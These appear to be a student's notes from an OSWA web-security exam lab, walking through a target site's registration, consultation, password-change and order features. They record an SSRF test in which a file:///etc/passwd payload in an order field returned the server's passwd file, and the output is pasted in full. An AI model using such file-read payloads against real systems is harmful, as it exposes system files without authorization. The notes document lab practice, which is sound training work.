# Starting Web Page
starting web page
![[ss-20250920-OSWA-Exam-ninox-pic1.png]]
learn more page has two people on it
![[ss-20250920-OSWA-Exam-ninox-pic2.png]]
clicking more gives you their information - niomi
![[ss-20250920-OSWA-Exam-ninox-pic3.png]]
![[ss-20250920-OSWA-Exam-ninox-pic4.png]]
# Account Register
able to register an account
![[ss-20250920-OSWA-Exam-ninox-pic5.png]]
account created
![[ss-20250920-OSWA-Exam-ninox-pic6.png]]
what it looks like in `burp`
![[ss-20250920-OSWA-Exam-ninox-pic7.png]]
# Consultation Request
able to request consultation
![[ss-20250920-OSWA-Exam-ninox-pic8.png]]
going to get back to me in 3 days
![[ss-20250920-OSWA-Exam-ninox-pic9.png]]what it looks like in burp 
![[ss-20250920-OSWA-Exam-ninox-pic10.png]]
# Change Password
able to change password
![[ss-20250920-OSWA-Exam-ninox-pic11.png]]
able to change passwords 
- userid3 looks interesting
![[ss-20250920-OSWA-Exam-ninox-pic12.png]]

# SSRF

![[ss-20250920-OSWA-Exam-ninox-pic13.png]]
echoed `itworked.html` to give some content to see if i am able to pull it 
![[ss-20250920-OSWA-Exam-ninox-pic14.png]]
after submitting
![[ss-20250920-OSWA-Exam-ninox-pic15.png]]
what it looks like in burp
![[ss-20250920-OSWA-Exam-ninox-pic16.png]]

# Orders
submit and save
![[ss-20250920-OSWA-Exam-ninox-pic19.png]]
was able to use `file:///etc/passwd` and `submit` the order for review when clicking the `1` in order ID
![[ss-20250920-OSWA-Exam-ninox-pic18.png]]
```bash
Content: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:104::/nonexistent:/usr/sbin/nologin systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin pollinate:x:105:1::/var/cache/pollinate:/bin/false sshd:x:106:65534::/run/sshd:/usr/sbin/nologin syslog:x:107:113::/home/syslog:/usr/sbin/nologin uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin student:x:1000:1000:student:/home/student:/bin/bash lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false postgres:x:113:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```
what it looks like when u first an order vs when u submit for review
![[ss-20250920-OSWA-Exam-ninox-pic20.png]]
put them both `under review` at `4:15am` - going to come back to see if anything changes, this would confirm some sort of `ssrf` if the admin interacts with it
![[ss-20250920-OSWA-Exam-ninox-pic21.png]]
# Random
able to view `pic01-06.jpg`
![[ss-20250920-OSWA-Exam-ninox-pic17.png]]